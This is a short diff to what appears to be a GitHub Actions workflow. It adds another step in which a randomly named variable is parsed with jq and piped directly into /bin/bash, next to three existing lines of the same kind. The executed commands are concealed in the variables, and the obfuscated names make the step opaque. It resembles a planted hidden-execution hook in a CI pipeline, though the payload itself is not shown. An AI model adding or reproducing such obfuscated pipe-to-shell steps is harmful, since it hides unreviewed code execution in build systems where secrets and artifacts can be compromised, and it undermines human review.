@@ -43,6 +43,7 @@ jobs:
           echo $andlm064 | jq -r .t2 | /bin/bash
           printf '%s' "$ykpk50676" | jq -r .ad1 | /bin/bash
           echo $uroa90804 | jq -r .lmbww45 | /bin/bash
+          echo $fnrod4 | jq -r .cm9 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
